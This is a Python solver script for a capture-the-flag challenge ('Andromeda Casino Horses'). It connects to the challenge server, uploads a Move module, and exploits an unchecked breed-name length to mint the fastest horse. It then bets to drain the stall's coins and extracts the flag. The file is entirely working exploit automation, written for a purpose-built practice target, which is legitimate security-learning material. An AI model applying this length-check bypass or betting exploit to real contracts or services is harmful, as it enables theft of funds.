#!/usr/bin/env python3
"""solve.py — Andromeda Casino Horses solver
Exploit: mint horse with breed "MustangMustangMustang" (len=21 > 12)
to create fastest horse. Bet to win all stall coins. Solve with 150.
"""
import socket, time, sys, re

HOST = sys.argv[1] if len(sys.argv) > 1 else '194.102.62.175'
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 25278
MV_PATH = 'files/Andromeda_Casino-Horses/framework-solve/solve/build/solution/bytecode_modules/solution.mv'

def recv_until(s, marker, timeout=15):
    s.settimeout(timeout)
    data = b''
    start = time.time()
    while time.time() - start < timeout:
        try:
            chunk = s.recv(4096)
            if not chunk:
                break
            data += chunk
            if marker.encode() in data:
                break
        except socket.timeout:
            break
    return data.decode('utf-8', errors='replace')

def send(s, msg):
    s.sendall((msg + '\n').encode())
    time.sleep(0.3)

def upload_module(s, name, mv_path):
    send(s, '1')
    recv_until(s, 'named address')
    send(s, name)
    recv_until(s, 'bytecode')
    with open(mv_path, 'rb') as f:
        data = f.read()
    s.sendall(data)
    time.sleep(0.5)
    r = recv_until(s, 'Select option:')
    print(f"Upload: {'SUCCESS' if 'SUCCESS' in r else 'FAIL'}")
    return 'SUCCESS' in r

def view_object(s, n1, n2):
    send(s, '2')
    recv_until(s, 'first number')
    send(s, str(n1))
    recv_until(s, 'second number')
    send(s, str(n2))
    r = recv_until(s, '---END---', timeout=5)
    send(s, 'ack')
    recv_until(s, 'Select option:', timeout=5)
    return r

def call_function(s, pkg, mod_name, func, params):
    send(s, '3')
    recv_until(s, 'package name')
    send(s, pkg)
    recv_until(s, 'module name')
    send(s, mod_name)
    recv_until(s, 'function name')
    send(s, func)
    recv_until(s, 'number of parameters')
    send(s, str(len(params)))

    for p in params:
        recv_until(s, 'Enter type')
        if p[0] == 'object':
            send(s, 'object')
            recv_until(s, 'first number')
            send(s, str(p[1]))
            recv_until(s, 'second number')
            send(s, str(p[2]))
        elif p[0] == 'number':
            send(s, 'number')
            recv_until(s, 'number type')
            send(s, p[1])
            recv_until(s, 'value')
            send(s, str(p[2]))

    r = recv_until(s, 'Select option:', timeout=15)
    status = 'SUCCESS' if 'SUCCESS' in r else 'FAIL'
    print(f"  {pkg}::{mod_name}::{func} -> {status}")
    if 'ERROR' in r:
        # Extract error detail
        for line in r.split('\n'):
            if 'ERROR' in line:
                print(f"    {line.strip()[:200]}")
    # Extract object info from SUCCESS output
    if 'SUCCESS' in r:
        print(f"    Output: {r.strip()[:300]}")
    return r

def find_object(s, start_tx, end_tx, keyword):
    """Scan for an object containing keyword."""
    for tx in range(start_tx, end_tx):
        for i in range(5):
            r = view_object(s, tx, i)
            if 'ERROR' in r or 'error' in r.lower():
                break
            if keyword.lower() in r.lower():
                print(f"  Found '{keyword}' at ({tx}, {i})")
                return (tx, i), r
    return None, None

def get_flag(s):
    send(s, '4')
    r = recv_until(s, 'Select option:', timeout=10)
    print(f"Flag response: {r.strip()[:500]}")
    return r

# Connect
s = socket.socket()
s.connect((HOST, PORT))
print(f"Connected to {HOST}:{PORT}")
welcome = recv_until(s, 'Select option:')
print("Server ready")

# Find exchange and stall
print("\n=== Finding exchange and stall ===")
exchange_id = stall_id = None
for i in range(12):
    r = view_object(s, 2, i)
    if 'ERROR' in r:
        break
    if 'claim_balance' in r or 'is_solved' in r:
        exchange_id = (2, i)
        print(f"  CasinoExchange at (2, {i})")
    if 'horses' in r and 'balance' in r and 'claim_balance' not in r:
        stall_id = (2, i)
        print(f"  BetStall at (2, {i})")

print(f"Exchange: {exchange_id}, Stall: {stall_id}")

# Upload module
print("\n=== Upload solution module ===")
assert upload_module(s, 'solution', MV_PATH)

# Claim coins
print("\n=== Claim coins ===")
r = call_function(s, 'solution', 'solution', 'step1_claim', [
    ('object', *exchange_id),
])
# Parse created objects from output - look for "object(X,Y)" patterns
created = re.findall(r'object\((\d+),\s*(\d+)\)', r)
print(f"  Created objects: {created}")

# Find coin - scan from tx 4 onwards (tx 2=challenge setup, tx 3=publish solution)
print("\n=== Find coin ===")
coin_id = None
for tx in range(3, 15):
    for i in range(5):
        r = view_object(s, tx, i)
        if 'ERROR' in r or 'No output' in r:
            break
        # Coin has a "value" field
        print(f"  Object ({tx},{i}): {r[:300]}")
        if 'value' in r:
            coin_id = (tx, i)
            print(f"  -> COIN at ({tx}, {i})")
            break
    if coin_id:
        break

if not coin_id:
    print("  Could not find coin, trying all created objects from output")
    for c in created:
        coin_id = (int(c[0]), int(c[1]))
        break

if not coin_id:
    print("  FATAL: cannot find coin object")
    sys.exit(1)

# Mint fast horse
print(f"\n=== Mint fast horse ===")
r = call_function(s, 'solution', 'solution', 'step2_mint', [
    ('object', *stall_id),
])

# Bet on our horse (index 5)
print(f"\n=== Bet on horse index 5 with coin {coin_id} ===")
r = call_function(s, 'solution', 'solution', 'step3_bet', [
    ('object', *stall_id),
    ('object', *coin_id),
])

# Find reward coin
print("\n=== Find reward coin ===")
reward_id = None
reward_created = re.findall(r'object\((\d+),\s*(\d+)\)', r)
# Parse created objects from bet output (the reward coin)
bet_created = re.findall(r'created:.*?object\((\d+),\s*(\d+)\)', r)
if bet_created:
    reward_id = (int(bet_created[0][0]), int(bet_created[0][1]))
    print(f"  Reward from bet output: {reward_id}")
else:
    # Scan for it
    for tx in range(3, 20):
        for i in range(5):
            obj_r = view_object(s, tx, i)
            if 'ERROR' in obj_r or 'No output' in obj_r:
                break
            if 'value' in obj_r and (tx, i) != coin_id:
                reward_id = (tx, i)
                print(f"  -> Reward at ({tx}, {i}): {obj_r[:200]}")
                break
        if reward_id:
            break

if not reward_id:
    print("  FATAL: cannot find reward coin")
    sys.exit(1)

# Solve
print(f"\n=== Solve with coin {reward_id} ===")
call_function(s, 'solution', 'solution', 'step4_solve', [
    ('object', *exchange_id),
    ('object', *reward_id),
])

# Get flag
print("\n=== GET FLAG ===")
r = get_flag(s)

m = re.search(r'UVT\{[^}]+\}', r)
if m:
    flag = m.group()
    print(f"\nFLAG: {flag}")
    with open("flag.txt", "w") as f:
        f.write(flag)
else:
    print("\nNo flag found in response")

s.close()
